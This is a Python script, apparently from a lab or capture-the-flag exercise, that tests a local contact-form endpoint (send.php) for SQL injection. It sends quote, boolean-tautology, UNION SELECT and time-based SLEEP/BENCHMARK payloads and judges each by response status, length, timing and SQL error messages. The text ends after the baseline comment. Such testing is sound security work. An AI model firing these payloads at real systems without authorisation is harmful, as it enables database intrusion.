import requests
import time
import re

# Target configuration
TARGET_URL = "http://127.0.0.1:32975/send.php"

# Parameters to test
PARAMETERS = ['fullname', 'email', 'phone', 'subject', 'message']

# Baseline values
BASELINE_VALUES = {
    'fullname': 'John Doe',
    'email': 'john@example.com',
    'phone': '1234567890',
    'subject': 'Test Subject',
    'message': 'This is a test message'
}

# SQL Injection payloads for detection
SQL_PAYLOADS = [
    # Basic quote tests
    ("Single quote", "'"),
    ("Double quote", '"'),
    
    # Boolean-based tests
    ("AND true", "' AND '1'='1"),
    ("AND false", "' AND '1'='2"),
    ("OR true", "' OR '1'='1"),
    ("OR true comment", "' OR '1'='1' --"),
    ("OR true hash", "' OR '1'='1' #"),
    
    # Numeric variation
    ("Num AND true", "1 AND 1=1"),
    ("Num AND false", "1 AND 1=2"),
    ("Num OR true", "1 OR 1=1"),
    
    # Union tests
    ("Union basic", "' UNION SELECT 1 --"),
    ("Union columns", "' UNION SELECT 1,2,3,4,5 --"),
    
    # Error-based
    ("Divide by zero", "1/0"),
    ("Single quote escape", "\\'"),
    
    # Time-based (for blind detection)
    ("SLEEP 2", "' OR SLEEP(2) --"),
    ("BENCHMARK", "' OR BENCHMARK(1000000,MD5(1)) --"),
]

# SQL error patterns to detect
SQL_ERROR_PATTERNS = [
    r'sql syntax',
    r'mysql',
    r'postgresql',
    r'oracle',
    r'sqlite',
    r'sql state',
    r'error in your sql',
    r'database error',
    r'unknown column',
    r'table.*doesn\'t exist',
    r'warning.*mysql',
    r'check the manual',
    r'deadlock',
    r'constraint violation'
]

def send_request(data, timeout=10):
    """Send POST request and return response details"""
    start_time = time.time()
    try:
        response = requests.post(
            TARGET_URL,
            data=data,
            timeout=timeout,
            allow_redirects=True
        )
        elapsed = time.time() - start_time
        return {
            'status': response.status_code,
            'text': response.text,
            'length': len(response.text),
            'time': elapsed,
            'error': None,
            'redirects': len(response.history)
        }
    except requests.exceptions.Timeout:
        return {'status': -1, 'text': 'TIMEOUT', 'length': 0, 'time': timeout, 'error': 'timeout', 'redirects': 0}
    except Exception as e:
        return {'status': -2, 'text': str(e), 'length': 0, 'time': 0, 'error': str(e), 'redirects': 0}

def detect_sqli_errors(text):
    """Check for SQL error messages in response"""
    found_errors = []
    text_lower = text.lower()
    for pattern in SQL_ERROR_PATTERNS:
        if re.search(pattern, text_lower):
            found_errors.append(pattern)
    return found_errors

def analyze_response(baseline, test, payload_name):
    """Compare test response against baseline"""
    differences = []
    
    # Check status code
    if test['status'] != baseline['status']:
        differences.append(f"Status: {baseline['status']} -> {test['status']}")
    
    # Check length difference
    length_diff = abs(test['length'] - baseline['length'])
    if length_diff > 10:  # Significant difference
        differences.append(f"Length diff: {length_diff}B")
    
    # Check timing difference
    time_diff = test['time'] - baseline['time']
    if time_diff > 1.0:  # More than 1 second slower
        differences.append(f"Time diff: +{time_diff:.2f}s")
    
    # Check for errors
    sql_errors = detect_sqli_errors(test['text'])
    if sql_errors:
        differences.append(f"SQL errors: {', '.join(sql_errors[:2])}")
    
    return differences

print("=" * 70)
print("BLACK-BOX SQL INJECTION ANALYSIS: send.php")
print("=" * 70)

# Step 1: Baseline request
